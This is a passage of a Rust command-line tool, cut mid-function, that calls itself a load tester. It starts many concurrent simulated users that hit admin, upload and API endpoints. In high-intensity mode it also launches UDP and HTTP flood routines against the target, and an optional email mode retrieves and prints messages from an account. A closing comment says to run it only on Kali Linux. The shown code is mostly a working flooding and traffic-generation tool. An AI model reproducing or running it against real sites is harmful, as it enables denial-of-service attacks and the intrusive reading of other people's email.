                        // Bot behavior: systematically access endpoints
                        let endpoints = if is_high_intensity {
                            ["/", "/api/v1/users", "/api/v2/data", "/admin", "/upload", "/graphql"]
                        } else {
                            ["/", "/sitemap.xml", "/robots.txt", "/feed", "/api", "/"]
                        };

                        for endpoint in &endpoints {
                            let url = format!("{}{}", target_url.trim_end_matches('/'), endpoint);

                            if is_high_intensity && rand::random::<f64>() < 0.7 {
                                // POST requests in high-intensity mode
                                let payload = create_load_test_payload();
                                let mut headers_with_content_type = headers.clone();
                                headers_with_content_type.insert("Content-Type", "application/json".parse().unwrap());
                                let _ = client.post(&url).headers(headers_with_content_type).body(payload).send().await;
                            } else {
                                let _ = client.get(&url).headers(headers.clone()).send().await;
                            }
                            request_count += 1;
                            tokio::time::sleep(Duration::from_millis(50)).await;
                        }
                    }
                    BehaviorPattern::ApiAccess => {
                        // API client behavior with authentication
                        let api_endpoint = API_ENDPOINTS[rand::random::<usize>() % API_ENDPOINTS.len()];
                        let url = format!("{}{}", target_url.trim_end_matches('/'), api_endpoint);

                        let mut headers_with_auth = headers.clone();
                        headers_with_auth.insert("Content-Type", "application/json".parse().unwrap());

                        // Generate and include authentication token
                        let auth_token = generate_auth_token(&url).await?;
                        headers_with_auth.insert("Authorization", format!("Bearer {}", auth_token).parse().unwrap());

                        if is_high_intensity {
                            // High-frequency API calls for load testing
                            let api_request_handles: Vec<_> = (0..50)
                                .map(|_| {
                                    let client_clone = client.clone();
                                    let url_clone = url.clone();
                                    let headers_clone = headers_with_auth.clone();
                                    tokio::spawn(async move {
                                        let payload = create_load_test_payload();
                                        let _ = client_clone
                                            .post(&url_clone)
                                            .headers(headers_clone)
                                            .body(payload)
                                            .send()
                                            .await;
                                    })
                                })
                                .collect();

                            future::join_all(api_request_handles).await;
                            request_count += 50;
                        } else {
                            let _ = client.get(&url).headers(headers_with_auth).send().await;
                            request_count += 1;
                        }
                    }
                    BehaviorPattern::MobileApp => {
                        // Mobile app behavior with device-specific headers
                        let mobile_endpoints = if is_high_intensity {
                            ["/", "/mobile", "/app", "/api/mobile", "/api/v2/mobile", "/upload"]
                        } else {
                            ["/", "/mobile", "/app", "/api/mobile", "/", "/"]
                        };

                        for endpoint in &mobile_endpoints {
                            let url = format!("{}{}", target_url.trim_end_matches('/'), endpoint);

                            let mut mobile_headers = headers.clone();
                            mobile_headers.insert("X-Mobile-Device", "true".parse().unwrap());

                            if is_high_intensity {
                                let payload = create_load_test_payload();
                                mobile_headers.insert("Content-Type", "application/json".parse().unwrap());
                                let _ = client.post(&url).headers(mobile_headers).body(payload).send().await;
                            } else {
                                let _ = client.get(&url).headers(mobile_headers).send().await;
                            }
                            request_count += 1;
                        }
                    }
                }

                total_requests.fetch_add(request_count, Ordering::Relaxed);

                // Random delays between sessions (shorter in high-intensity mode)
                if rand::random::<f64>() < 0.3 {
                    let delay = if is_high_intensity {
                        Duration::from_millis(rand::random::<u64>() % 1000 + 100)
                    } else {
                        Duration::from_secs(rand::random::<u64>() % 300 + 60)
                    };
                    tokio::time::sleep(delay).await;
                }
            }
        }
    }

    let final_total = total_requests.load(Ordering::Relaxed);
    info!("User session completed - {} requests made", final_total);
    Ok(())
}

/// Displays banner from banner.txt file
fn display_banner() {
    // Clear screen for clean display
    print!("\x1B[2J\x1B[1;1H");
    io::stdout().flush().unwrap();
    
    // Read and display banner from file
    match fs::read_to_string("banner.txt") {
        Ok(banner_content) => {
            println!("\x1B[1;36m{}", banner_content);
            println!("\x1B[0m");
        }
        Err(_) => {
            // Fallback banner if file not found
            println!("\x1B[1;36m");
            println!("    ________                 _____");
            println!("   / ____/ /_  ___  ___   __/ ___/");
            println!("  / /_  / / / / / |/_/ | / / __ \\ ");
            println!(" / __/ / / /_/ />  < | |/ / /_/ / ");
            println!("/_/   /_/\\__,_/_/|_| |___/\\____/  ");
            println!("                                  ");
            println!("\x1B[0m");
        }
    }
}

/// Prompts user for confirmation before starting the load test
fn prompt_user_confirmation() -> bool {
    print!("\x1B[1;33m[?] Do you want to proceed with the load test? (yes/no): \x1B[0m");
    io::stdout().flush().unwrap();
    
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    
    let response = input.trim().to_lowercase();
    matches!(response.as_str(), "yes" | "y")
}

/// Main orchestration function for load testing
///
/// Coordinates multiple simulated users and optional high-intensity load tests
/// based on configuration. Manages concurrent sessions and reports results.
async fn run_load_test(args: CliArgs) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    display_banner();
    
    println!("Target: {}", args.target);
    println!("Concurrent Users: {}", args.concurrent_users);
    println!("Duration: {}s", args.duration_secs);
    println!("Traffic Intensity: {}", args.intensity);
    println!("Mobile Traffic: {}", args.mobile_traffic);
    println!("Bot Traffic: {}", args.bot_traffic);
    println!("API Traffic: {}", args.api_traffic);
    
    // Display email testing info if enabled
    if args.email_testing {
        println!("Email Testing: Enabled");
        if let Some(username) = &args.email_username {
            println!("Email Account: {}", username);
        }
        println!("Email Count: {}", args.email_count);
    }
    println!();

    let mut task_handles = Vec::new();
    let additional_load_counter = Arc::new(AtomicUsize::new(0));

    // Run email testing if enabled
    if args.email_testing {
        info!("Starting email protocol testing");
        let args_clone = args.clone();
        let email_handle = tokio::spawn(async move {
            match run_email_test(&args_clone).await {
                Ok(email_result) => {
                    println!("\x1B[1;36m[+] Email Test Results:\x1B[0m");
                    println!("  Emails Sent: {}", email_result.emails_sent);
                    println!("  Emails Retrieved: {}", email_result.emails_retrieved);
                    println!("  Total Size: {} bytes", email_result.total_size_bytes);
                    println!("  Avg Response Time: {:.2}ms", email_result.average_response_time_ms);
                    
                    if !email_result.extracted_info.is_empty() {
                        println!("\n\x1B[1;33m[+] Recent Emails Found:\x1B[0m");
                        for (i, email_info) in email_result.extracted_info.iter().take(5).enumerate() {
                            println!("  {}. From: {}", i + 1, email_info.from);
                            println!("     Subject: {}", email_info.subject);
                            println!("     Date: {}", email_info.date);
                            println!("     Size: {} bytes | Attachments: {} | Unread: {}", 
                                email_info.size_bytes, 
                                email_info.has_attachments, 
                                email_info.is_unread);
                            if i < 4 && i < email_result.extracted_info.len() - 1 {
                                println!();
                            }
                        }
                    }
                    
                    if !email_result.errors.is_empty() {
                        println!("\n\x1B[1;31m[!] Email Test Errors:\x1B[0m");
                        for error in email_result.errors.iter().take(3) {
                            println!("  {}", error);
                        }
                    }
                }
                Err(e) => {
                    error!("Email test failed: {}", e);
                }
            }
        });
        task_handles.push(email_handle);
    }

    // Launch additional high-intensity tests if configured
    if args.intensity == "high" {
        info!("Launching high-intensity load tests");

        // UDP flood test
        let target_clone = args.target.clone();
        let counter_clone = additional_load_counter.clone();
        let udp_handle = tokio::spawn(async move {
            if let Ok(packet_count) = execute_udp_flood(&target_clone).await {
                counter_clone.fetch_add(packet_count, Ordering::Relaxed);
                info!("UDP flood test: {} packets sent", packet_count);
            }
        });
        task_handles.push(udp_handle);

        // HTTP flood test
        let target_clone = args.target.clone();
        let intensity_clone = args.intensity.clone();
        let counter_clone = additional_load_counter.clone();
        let http_handle = tokio::spawn(async move {
            if let Ok(request_count) = execute_http_flood(&target_clone, &intensity_clone).await {
                counter_clone.fetch_add(request_count, Ordering::Relaxed);
                info!("HTTP flood test: {} requests sent", request_count);
            }
        });
        task_handles.push(http_handle);
    }

    // Create and launch simulated user sessions
    for user_index in 0..args.concurrent_users {
        let target_url = args.target.clone();
        let duration = args.duration_secs;
        let intensity = args.intensity.clone();

        // Distribute device types based on configuration
        let device_type = if args.bot_traffic && user_index < args.concurrent_users / 4 {
            DeviceType::Bot
        } else if args.api_traffic && user_index >= args.concurrent_users / 4 && user_index < args.concurrent_users / 2 {
            DeviceType::ApiClient
        } else if args.mobile_traffic && user_index >= args.concurrent_users / 2 {
            DeviceType::Mobile
        } else {
            DeviceType::Desktop
        };

        let user_profile = create_user_profile(device_type);

        let session_handle = tokio::spawn(async move {
            if let Err(e) = simulate_user_session(user_profile, &target_url, duration, &intensity).await {
                error!("User {} session failed: {}", user_index, e);
            }
        });

        task_handles.push(session_handle);

        // Stagger user session starts for realistic traffic patterns
        let mut rng = rand::thread_rng();
        let stagger_delay = Duration::from_millis(rng.gen_range(50..2000));
        sleep(stagger_delay).await;
    }

    info!(
        "All {} user sessions initiated - load test in progress...",
        args.concurrent_users
    );

    // Wait for all sessions to complete
    for handle in task_handles {
        let _ = handle.await;
    }

    let final_additional_load = additional_load_counter.load(Ordering::Relaxed);
    println!("Load test completed successfully");
    println!("Additional load operations: {}", final_additional_load);
    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    // Initialize logging
    tracing_subscriber::fmt::init();

    // Check if help or version is requested (these will exit before banner)
    let args_vec: Vec<String> = std::env::args().collect();
    let is_help_or_version = args_vec.iter().any(|arg| 
        arg == "--help" || arg == "-h" || arg == "--version" || arg == "-V"
    );

    // If help/version requested, parse args immediately (clap will handle display and exit)
    if is_help_or_version {
        let _args = CliArgs::parse();
        return Ok(());
    }

    // Display animated banner for normal execution
    display_banner();

    // Parse command-line arguments
    let args = CliArgs::parse();

    // Prompt user for confirmation
    if !prompt_user_confirmation() {
        println!("\x1B[1;31m[!] Load test cancelled by user.\x1B[0m");
        return Ok(());
    }

    println!("\x1B[1;32m[+] Starting load test...\x1B[0m");
    println!();

    // Execute load test
    if let Err(e) = run_load_test(args).await {
        error!("Load test failed: {}", e);
        return Err(e);
    }

    Ok(())
}
//I am from C++ Backgroud Okay Not Recommendate For Parrot Os Only use in kali Linux
//The following candidates are not ClayTechGroup or ClayhackerGroups
